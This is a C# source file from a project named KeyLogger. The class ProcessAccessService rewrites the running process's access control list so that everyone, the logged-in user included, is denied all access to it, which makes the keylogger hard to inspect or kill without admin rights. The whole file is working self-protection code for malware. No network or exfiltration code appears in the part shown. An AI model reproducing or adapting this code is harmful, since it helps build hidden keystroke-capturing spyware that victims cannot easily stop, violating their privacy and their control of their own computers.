using KeyLogger.Enums;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Security.AccessControl;
using System.Security.Principal;
using static KeyLogger.WinApis.AdvApi32;

namespace KeyLogger.Services
{
	internal class ProcessAccessService
	{

		private RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
		{
			const int DACL_SECURITY_INFORMATION = 0x00000004;
			byte[] psd = new byte[0];
			uint bufSizeNeeded;
			GetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION, psd, 0, out bufSizeNeeded);
			if (bufSizeNeeded < 0 || bufSizeNeeded > short.MaxValue)
				throw new Win32Exception();
			if (!GetKernelObjectSecurity(
				 processHandle,
				 DACL_SECURITY_INFORMATION,
				 psd = new byte[bufSizeNeeded],
				 bufSizeNeeded,
				 out bufSizeNeeded))
				throw new Win32Exception();
			return new RawSecurityDescriptor(psd, 0);
		}

		private void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor dacl)
		{
			const int DACL_SECURITY_INFORMATION = 0x00000004;
			byte[] rawsd = new byte[dacl.BinaryLength];
			dacl.GetBinaryForm(rawsd, 0);
			if (!SetKernelObjectSecurity(processHandle, DACL_SECURITY_INFORMATION, rawsd))
				throw new Win32Exception();
		}

		internal void BlockForNotAdminUsers()
		{
			IntPtr hProcess = Process.GetCurrentProcess().Handle;
			var dacl = GetProcessSecurityDescriptor(hProcess);
			var sid = WindowsIdentity.GetCurrent().User.AccountDomainSid;

			dacl.DiscretionaryAcl.InsertAce(
				 0,
				 new CommonAce(
					  AceFlags.None,
					  AceQualifier.AccessDenied,
					  (int)ProcessAccessRights.PROCESS_ALL_ACCESS,
					  new SecurityIdentifier(WellKnownSidType.WorldSid, sid),
					  false,
					  null));

			SetProcessSecurityDescriptor(hProcess, dacl);
		}
	}
}
